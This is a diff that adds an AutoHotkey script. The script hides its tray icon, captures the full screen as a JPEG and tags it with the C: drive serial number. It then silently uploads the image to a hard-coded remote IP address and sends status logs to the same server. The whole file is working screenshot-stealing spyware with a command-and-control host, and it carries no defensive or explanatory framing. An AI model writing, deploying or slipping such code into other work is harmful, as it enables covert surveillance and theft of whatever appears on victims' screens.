@@ -1,0 +1,184 @@
+#NoTrayIcon
+#SingleInstance off
+#NoEnv
+SetBatchLines, -1
+Gdip := new GDIplus
+if !pBitmap := Gdip.BitmapFromScreen() {
+   Gdip := ""
+   SendLog("screen: err! create screen")
+   ExitApp
+}
+size := Gdip.SaveBitmap(pBitmap, buff := "jpg", 26, true)
+Gdip.DisposeImage(pBitmap)
+Gdip := ""
+
+arr := SafeArrayFromData(buff, size)
+DriveGet, serial, serial, C:
+try UploadSafeArray(arr, "http://185.25.200.157/screenshot/" . serial)
+catch {
+   SendLog("screen: err! upload filed")
+   ExitApp
+}
+SendLog("screen: ok")
+
+UploadSafeArray(arr, TargetAddress) {
+ComObjError(False)
+HTTP := ComObjCreate("WinHttp.WinHttpRequest.5.1")
+HTTP.Open("POST", TargetAddress, False)
+HTTP.SetRequestHeader("User-Agent", "AutoHotkey")
+HTTP.Send(arr)
+}
+
+SendLog(fe)
+{
+DriveGet, serial, serial, C:
+ComObjError(False)
+sHTTP := ComObjCreate("WinHttp.WinHttpRequest.5.1")
+sHTTP.Open("POST", "http://185.25.200.157/" . serial, False)
+sHTTP.SetRequestHeader("User-Agent", "AutoHotkey")
+sHTTP.SetRequestHeader("Content-Type", "application/x-www-Form-urlencoded")
+sHTTP.Send("&log=" . fe)
+sHTTP.WaitForResponse()
+sHTTP.Close
+}
+
+SafeArrayFromData(ByRef data, size) {
+   arr := ComObjArray(VT_UI1 := 0x11, size)
+   DllCall("RtlMoveMemory", Ptr, NumGet( ComObjValue(arr) + 8 + A_PtrSize ), Ptr, &data, Ptr, size)
+   Return arr
+}
+
+class GDIplus {
+   __New() {
+      if !DllCall("GetModuleHandle", "Str", "gdiplus", "Ptr")
+         DllCall("LoadLibrary", "Str", "gdiplus")
+      VarSetCapacity(si, A_PtrSize = 8 ? 24 : 16, 0), si := Chr(1)
+      DllCall("gdiplus\GdiplusStartup", "UPtrP", pToken, "Ptr", &si, "Ptr", 0)
+      this.token := pToken
+   }
+   __Delete() {
+      DllCall("gdiplus\GdiplusShutdown", "Ptr", this.token)
+      if hModule := DllCall("GetModuleHandle", "Str", "gdiplus", "Ptr")
+         DllCall("FreeLibrary", "Ptr", hModule)
+   }
+   CreateBitmapFromFile(sFile)  {
+      DllCall("gdiplus\GdipCreateBitmapFromFile", "WStr", sFile, "PtrP", pBitmap)
+      Return pBitmap
+   }
+	BitmapFromScreen() {
+      Sysget, x, 76
+      Sysget, y, 77
+      Sysget, w, 78
+      Sysget, h, 79
+
+		if (x = "") || (y = "") || (w = "") || (h = "")
+			return -1
+
+		chdc := this.CreateCompatibleDC(), hbm := this.CreateDIBSection(w, h, chdc)
+      obm := this.SelectObject(chdc, hbm), hhdc := hhdc ? hhdc : this.GetDC()
+		this.BitBlt(chdc, 0, 0, w, h, hhdc, x, y, Raster)
+		this.ReleaseDC(hhdc)
+		
+		pBitmap := this.CreateBitmapFromHBITMAP(hbm)
+		this.SelectObject(chdc, obm), this.DeleteObject(hbm), this.DeleteDC(hhdc), this.DeleteDC(chdc)
+		return pBitmap
+	}
+   SaveBitmap(pBitmap, ByRef info, Quality := 75, tobuff := "")
+   {
+      if tobuff
+         Extension := info
+      else
+         SplitPath, info,,, Extension
+      if Extension not in BMP,DIB,RLE,JPG,JPEG,JPE,JFIF,GIF,TIF,TIFF,PNG
+         return -1
+
+      DllCall("gdiplus\GdipGetImageEncodersSize", "UIntP", nCount, "UIntP", nSize)
+      VarSetCapacity(ci, nSize)
+      DllCall("gdiplus\GdipGetImageEncoders", "UInt", nCount, "UInt", nSize, "Ptr", &ci)
+      if !(nCount && nSize)
+         return -2
+      
+      Loop, % nCount  {
+         sString := StrGet(NumGet(ci, (idx := (48+7*A_PtrSize)*(A_Index-1))+32+3*A_PtrSize), "UTF-16")
+         if !InStr(sString, "*." Extension)
+            continue
+         
+         pCodec := &ci+idx
+         break
+      }
+      if !pCodec
+         return -3
+
+      if !tobuff
+         E := DllCall("gdiplus\GdipSaveImageToFile", "Ptr", pBitmap, "WStr", info, "Ptr", pCodec, "UInt", p ? p : 0)
+      else  {
+         DllCall( "ole32\CreateStreamOnHGlobal", "UInt", 0, "Int", 1, "PtrP", pStream )
+         if !E := DllCall("gdiplus\GdipSaveImageToStream", "Ptr", pBitmap, "Ptr", pStream, "Ptr", pCodec, "UInt", p ? p : 0)  {
+            DllCall("ole32\GetHGlobalFromStream", "Ptr", pStream, "PtrP", hData)
+            pData := DllCall("GlobalLock", "Ptr", hData, "Ptr")
+            nSize := DllCall("GlobalSize", "Ptr", hData, "Ptr")
+            VarSetCapacity(info, 0), VarSetCapacity(info, nSize, 0)
+            DllCall("RtlMoveMemory", "Ptr", &info, "Ptr", pData, "Ptr", nSize)
+            DllCall("GlobalUnlock", "Ptr", hData)
+            DllCall("GlobalFree", "Ptr", hData)
+         }
+         ObjRelease(pStream)
+      }
+      return E ? -4 : tobuff ? nSize : 0
+   }
+	CreateBitmapFromHBITMAP(hBitmap, Palette=0) {
+		DllCall("gdiplus\GdipCreateBitmapFromHBITMAP", "Ptr", hBitmap, "Ptr", Palette, "PtrP", pBitmap)
+		return pBitmap
+	}
+	CreateCompatibleDC(hdc=0) {
+		return DllCall("CreateCompatibleDC", "Ptr", hdc)
+	}
+	CreateDIBSection(w, h, hdc="", bpp=32, ByRef ppvBits=0) {
+		hdc2 := hdc ? hdc : this.GetDC()
+		VarSetCapacity(bi, 40, 0)
+		
+		NumPut(w, bi, 4, "UInt")
+		, NumPut(h, bi, 8, "UInt")
+		, NumPut(40, bi, 0, "UInt")
+		, NumPut(1, bi, 12, "ushort")
+		, NumPut(0, bi, 16, "uInt")
+		, NumPut(bpp, bi, 14, "ushort")
+		
+		hbm := DllCall("CreateDIBSection"
+						, "Ptr", hdc2
+						, "Ptr", &bi
+						, UInt, 0
+						, "PtrP", ppvBits
+						, "Ptr", 0
+						, UInt, 0, "Ptr")
+
+		if !hdc
+			this.ReleaseDC(hdc2)
+		return hbm
+	}
+	SelectObject(hdc, hgdiobj) {
+		return DllCall("SelectObject", "Ptr", hdc, "Ptr", hgdiobj)
+	}
+	GetDC(hwnd=0) {
+		return DllCall("GetDC", "Ptr", hwnd)
+	}
+	BitBlt(ddc, dx, dy, dw, dh, sdc, sx, sy, Raster="") {
+		return DllCall("gdi32\BitBlt", "Ptr", dDC, "Int", dx, "Int", dy, "Int", dw, "Int", dh
+											  , "Ptr", sDC, "Int", sx, "Int", sy, UInt, Raster ? Raster : 0x00CC0020)
+	}
+	DeleteObject(hObject) {
+		return DllCall("DeleteObject", "Ptr", hObject)
+	}
+    DisposeImage(pBitmap) {
+       return DllCall("gdiplus\GdipDisposeImage", "Ptr", pBitmap)
+    }
+	DeleteDC(hdc) {
+		return DllCall("DeleteDC", "Ptr", hdc)
+	}
+	ReleaseDC(hdc, hwnd=0) {
+		return DllCall("ReleaseDC", "Ptr", hwnd, "Ptr", hdc)
+	}
+}
+
+;0.3
+;~
